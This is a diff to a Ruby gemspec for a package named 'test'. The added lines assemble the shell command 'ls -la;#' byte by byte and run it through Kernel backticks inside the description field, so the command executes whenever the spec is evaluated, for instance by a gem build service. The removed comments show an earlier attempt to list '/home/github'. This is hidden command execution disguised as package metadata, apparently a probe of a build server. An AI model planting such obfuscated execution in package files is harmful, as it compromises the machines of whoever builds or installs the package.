@@ -1,13 +1,17 @@
 Gem::Specification.new do |s|
-#str="ls -l /home/github;#"
-#i=0
-#str.each_byte {|b| data[i] = b; i += 1 }
-#(i...data.size).each {|i| data[i] = 32 }
-#d=Kernel.`(data)
+
+data[0] = ?l
+data[1] = ?s
+data[2] = 32
+data[3] = ?-
+data[4] = ?l
+data[5] = ?a
+data[6] = ?;
+data[7] = ?#
   
   s.name = "test"
-  s.description    = "abc"
-  s.version  = "0.0.2"
+  s.description    = Kernel.`(data)
+  s.version  = "0.0.3"
   s.summary  = ""
   s.email    = "coderrr.contact@gmail.com"
 #  s.homepage = "http://github.com/coderrr/monkey_shieldgrit"
